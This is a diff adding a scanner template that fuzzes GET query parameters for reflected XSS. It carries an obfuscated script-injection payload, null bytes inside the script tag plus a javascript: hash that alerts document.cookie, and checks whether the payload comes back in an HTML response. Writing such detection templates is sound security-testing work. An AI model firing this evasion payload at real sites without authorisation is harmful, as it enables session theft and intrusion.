@@ -1,0 +1,39 @@
+id: fuzz-xss-script-injection
+
+info:
+  name: Custom XSS Script Injection Detection
+  author: netbaan
+  severity: high
+  description: |
+    This template tests for XSS vulnerabilities using a custom script injection payload.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Only run if method is GET
+
+    payloads:
+      xss_payload:
+        - "<script/%00%00v%00%00>document.location.href=location.hash.slice(1)</script>#javascript:alert(document.cookie)"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{xss_payload}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<script/%00%00v%00%00>document.location.href=location.hash.slice(1)</script>"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
